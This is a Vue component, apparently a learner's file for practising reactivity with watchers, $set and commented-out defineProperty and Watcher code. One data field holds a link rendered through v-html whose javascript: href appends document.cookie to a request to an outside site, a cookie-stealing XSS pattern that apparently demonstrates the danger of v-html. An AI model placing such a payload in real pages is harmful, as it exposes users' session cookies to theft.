<template>
  <div class="page">
    我是首页
    <p>{{obj.name}}</p>
    <button @click="changeName">变换</button>
    <button @click="addProperty">增加属性</button>
    <p>{{obj.newPro}}</p>
    <div v-html="str"></div>
  </div>
</template>

<script>
// import defineReactive from './defineReactive';
// import Observer from './Observer';
// import observe from './observe';
import './array';
// import Watcher from './Watcher';
export default {
  name: 'home',
  data() {
    return {
      obj: {},
      index: 0,
      str: `<a href="javascript:location.href='http://www.baidu.com?${document.cookie}'">好东西</a>`
    }
  },
  watch: {
    // obj: {
    //   handler:  function (val, oldVal){
    //     console.log(this);
    //     console.log(val, oldVal);
    //   },
    //   deep: true,
    //   immediate: true,// 该回调会在监听开始后立即被回调
    // },
    'obj.c.d': {
      handler: function (nval, oval) {
        console.log(nval, oval);
      }
    }
  },

  beforeMount() {
    this.obj = {
      name: '张森云',
      c: {
        d: 's',
      }
    }
  },
  mounted() {
    // const obj = {
    //   a: {
    //     m: {
    //       n:55,
    //     }
    //   },
    //   b: 4,
    //   g: [1, 2,3,4,5],
    // };
    // // 创建observe函数，注意函数的名字没有r
    // observe(obj);
    // console.log(obj);
    // console.log('sss');
    // new Watcher(obj, 'a.m.n', (val,oldVal) => {
    //   console.log('XXXXX数据发生变化了', val, oldVal);
    // })
    // new Watcher(obj, 'a.m.n', (val) => {
    //   console.log('XXX', val)
    // })
    // obj.a.m.n = 88;
    // obj.a = 77;
    // obj.a = 55;
    // obj.b =  56;
    // console.log(obj)
    // obj.g.splice(2, 0, [32, 12]);
    // console.log(obj.g);
    // function defineReactive(obj, key, val) {
    //   // 生成闭包 val的中间变量
    //   Object.defineProperty(obj,key, {
    //     enumerable: true, /* 是否可以被枚举*/
    //     configurable: true,/*可被配置*/
    //     get() {
    //       return val;
    //     },
    //     set(v) {
    //       if (v=== val) {
    //         return;
    //       }
    //       val = v;
    //     }
    //   });
    // }
    // defineReactive(obj,'a', 2);
    // console.log(obj.a);
    // obj.a = 5;
    // console.log(obj.a);
    // Object.defineProperty(obj,'c', {
    //   value: 3,
    //   // writable: true, // 是否可被修改
    //   enumerable: true, /* 是否可以被枚举*/
    // });
    // Object.defineProperty(obj,'b', {
    //   value: 4,
    //   // writable: true,
    // });
    // for (const objKey in obj) {
    //   console.log(objKey);
    // }
  },
  methods: {
    changeName() {
      // this.obj.name = this.obj.name  + (++this.index);
      this.obj.c.d = 'sdd'+ (++this.index);
    },
    // 增加响应式属性
    addProperty() {
      // this.newPro = '张三呢呀';
      this.$set(this.obj,'newPro', '张三呢呀');
      console.log(this);
    }
  }


}
</script>

<style scoped>

</style>